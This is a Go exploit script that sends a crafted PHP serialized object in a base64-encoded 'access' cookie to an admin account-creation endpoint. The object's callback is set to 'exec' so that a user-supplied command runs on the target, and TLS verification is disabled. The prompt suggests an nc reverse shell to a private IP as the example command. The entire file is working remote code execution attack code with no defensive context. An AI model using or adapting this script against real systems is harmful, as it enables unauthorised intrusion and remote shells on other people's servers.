package main

import (
    "fmt"
    "net/http"
    "net/url"
    "crypto/tls"
    b64 "encoding/base64"
    "bufio"
    "os"
)

func main() {
    
    var target_URL string
    fmt.Println("Target (e.g. https://localhost:9000):")
    fmt.Scanln(&target_URL)

    var cmd string
    fmt.Println("Command (e.g. nc 192.168.0.10 2345 -e sh):")

    scanner := bufio.NewScanner(os.Stdin)
    scanner.Split(bufio.ScanLines)
    scanner.Scan()
    cmd = scanner.Text()
    
    if err := scanner.Err(); err != nil {
        panic(err)
    }

    fmt.Printf("[*] INFO: Preparing to send command: \"%s\" to \"%s\"\n", cmd, target_URL)

    // target_URL must have this format: e.g. https://localhost:9090
    target_URL = target_URL+"/admin/api/v22.4/users/createUserAccount.php"
    const php_serialized_injection_template string = "O:14:\"AccountBuilder\":2:{s:8:\"username\";s:%d:\"%s\";s:6:\"passwd\";O:10:\"CustomDict\":1:{s:12:\"callback_fct\";s:4:\"exec\";}}"

    // Create cookie
    cookie_value := fmt.Sprintf(php_serialized_injection_template, len(cmd), cmd)
    b64_cookie := b64.StdEncoding.EncodeToString([]byte(cookie_value))
    url_encoded_b64_cookie_val := url.QueryEscape(b64_cookie)

    crafted_cookie := &http.Cookie{
        Name: "access",
        Value: url_encoded_b64_cookie_val,
    }

    // Create connection
    tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }

    client := http.Client{Transport: tr}

    req, err := http.NewRequest("GET", target_URL, nil)
    if err != nil {
        fmt.Printf("ERROR: Creating a new request to %s: %s\n", target_URL, err)
        panic(err)
    }

    req.AddCookie(crafted_cookie)

    // Send request
    fmt.Printf("[*] INFO: Sending request...\n")
    res, err := client.Do(req)
    if err != nil {
        fmt.Printf("ERROR: sending a request to %s: %s\n", target_URL, err)
        panic(err)
    }
    fmt.Printf("[*] INFO: Request sent, status: %d\n", res.StatusCode)
    defer res.Body.Close()
    
    fmt.Println("[*] INFO: The command \"%s\" should have been executed on %s.\n", cmd, target_URL)
    
}
